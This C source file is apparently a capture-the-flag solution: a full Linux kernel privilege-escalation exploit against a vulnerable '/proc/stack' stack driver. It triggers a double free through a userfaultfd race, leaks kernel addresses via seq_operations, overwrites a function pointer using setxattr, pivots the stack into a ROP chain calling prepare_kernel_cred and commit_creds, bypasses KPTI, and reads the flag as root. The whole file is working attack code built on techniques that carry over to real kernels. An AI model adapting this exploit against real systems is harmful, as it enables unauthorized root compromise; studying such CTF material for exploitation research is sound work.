#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/types.h>
#include <poll.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <errno.h>
#include <linux/userfaultfd.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/shm.h>
#include <attr/xattr.h>

#define CMD_PUSH 0x57ac0001
#define CMD_POP 0x57ac0002

/*
/ # cat /proc/kallsyms | grep commit_creds
ffffffff81069c10 T commit_creds
/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff81069e00 T prepare_kernel_cred
*/

#define PAGE_OFFSET (0xffff880000000000UL)

unsigned long off_commit_creds = 0xffffffff81069c10 - PAGE_OFFSET;
unsigned long off_prepare_kernel_cred = 0xffffffff81069e00 - PAGE_OFFSET;

unsigned long off_mov_esp_pop_rbp = 0xffffffff8110f850 - PAGE_OFFSET; // : mov esp, 0x5b004948 ; pop rbp ; ret
unsigned long off_pop_rdi = 0xffffffff81034505- PAGE_OFFSET; // : pop rdi ; ret
unsigned long off_pop_rcx = 0xffffffff81038af4- PAGE_OFFSET; // : pop rcx ; ret
unsigned long off_mov_rdi_rax_rep_pop_rbp = 0xffffffff8101877f- PAGE_OFFSET; // : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; pop rbp ; ret
unsigned long off_bypass_pti_swapgs_iretq = 0xffffffff81600a4a- PAGE_OFFSET;

unsigned long addr_stack = 0x5b004948;

int fd;

unsigned long urflags, ucs, uss;
void save_state(void) {
    __asm__ volatile (
            "mov %0, cs\n\t"
            "mov %1, ss\n\t"
            "pushfq\n\t"
            "pop %2\n\t"
            : "=r"(ucs), "=r"(uss), "=r"(urflags));
}

void shell(void) {
    // system("/bin/sh"); // panics. Maybe because slub is corrupted?
    system("cat /flag");
}

void push(unsigned long *value_p) {
    ioctl(fd, CMD_PUSH, value_p);
}


void pop(unsigned long *value_p) {
    ioctl(fd, CMD_POP, value_p);
}


#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
} while (0)

static void *fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    unsigned long long ubuf[128];
    unsigned long ret;

    uffd = (long) arg;

    for (;;) {
        /* See what poll() tells us about the userfaultfd */
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        /* Read an event from the userfaultfd */
        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }
        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption */
        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        printf("[+] Handle userfaultfd at 0x%llx\n", msg.arg.pagefault.address);
        pop(&ret);

        // uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
        //     ~(page_size - 1);
        memset(ubuf, 0, sizeof(ubuf));
        uffdio_copy.dst = msg.arg.pagefault.address;
        uffdio_copy.src = (__u64)ubuf;
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        break;
    }
    return (void *)ret;
}


pthread_t config_userfaultfd(unsigned long addr_fault) {
    long uffd;          /* userfaultfd file descriptor */
    uint64_t len;       /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    len = 0x1000;
    uffdio_register.range.start = addr_fault;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }
    return thr;
}


int main(void) {
    save_state();
    if ((fd = open("/proc/stack", O_RDWR)) < 0) {
        perror("open");
        return 1;
    }
    unsigned long t = 1;
    push(&t);

    unsigned long buf[0x100];
    pthread_t thr;

    unsigned long addr_fault = (unsigned long)mmap((void *)0xdead000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr_fault != 0xdead000)
        errExit("mmap");

    thr = config_userfaultfd(addr_fault);
    printf("[+] Pop and trigger userfaultfd to double free\n");
    pop((void *)addr_fault);
    pthread_join(thr, NULL);

    puts("[+] Allocate seq_operations");
    int stat_fd;
    if ((stat_fd = open("/proc/self/stat", O_RDONLY)) < 0) {
        perror("open");
        return 1;
    }

    puts("[+] Leak address");
    addr_fault = (unsigned long)mmap((void *)0xbeef000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr_fault != 0xbeef000) {
        perror("mmap");
        return 1;
    }
    thr = config_userfaultfd(addr_fault);
    push((unsigned long *)addr_fault);
    unsigned long *data;
    pthread_join(thr, (void **)&data);
    printf("[+] Leaked: %p\n", (void *)data);

    unsigned long page_offset = (unsigned long)data - 0x77ff8113be80;
    printf("[+] page_offset = %p\n", (void *)page_offset);

    printf("[+] Prepare ROP payload\n");
    unsigned long addr_stack_page = addr_stack & ~0xfff;
    if (mmap((void *)addr_stack, 0x20000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != (void *)addr_stack_page) {
        perror("mmap");
        return 1;
    }

    unsigned long *stack = (unsigned long *)addr_stack;
    *stack ++= 0xdeadbeef; // pop rbp
    *stack ++= page_offset + off_pop_rdi;
    *stack ++= 0UL;
    *stack ++= page_offset + off_prepare_kernel_cred;
    *stack ++= page_offset + off_pop_rcx;
    *stack ++= 0UL;
    *stack ++= page_offset + off_mov_rdi_rax_rep_pop_rbp;
    *stack ++= 0xdeadbeef; // pop rbp
    *stack ++= page_offset + off_commit_creds;
    *stack ++= page_offset + off_bypass_pti_swapgs_iretq;
    *stack ++= 0xdeadbeef; // pop rax
    *stack ++= 0xdeadbeef; // pop rdi
    *stack ++= (unsigned long)shell; // iretq
    *stack ++= ucs;
    *stack ++= urflags;
    *stack ++= addr_stack_page + 0x10000;
    *stack ++= uss;

    printf("[+] Double free again\n");
    addr_fault = (unsigned long)mmap((void *)0xcafe000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr_fault != 0xcafe000) {
        perror("mmap");
        return 1;
    }

    t = 3;
    push(&t);
    thr = config_userfaultfd(addr_fault);
    pop((void *)addr_fault);
    pthread_join(thr, NULL);

    printf("[+] Allocate seq_operations\n");
    if ((stat_fd = open("/proc/self/stat", O_RDONLY)) < 0) {
        perror("open");
        return 1;
    }
    printf("[+] Overwrite seq_operations via setxattr\n");
    unsigned long buf_so[4] = {};
    buf_so[0] = 0xdead;
    buf_so[1] = 0xbeef;
    buf_so[2] = 0xcafe;
    buf_so[3] = page_offset + off_mov_esp_pop_rbp;
    setxattr("/tmp", "hoge", buf_so, sizeof(buf_so), XATTR_CREATE);
    read(stat_fd, NULL, 0);

    return 0;
}
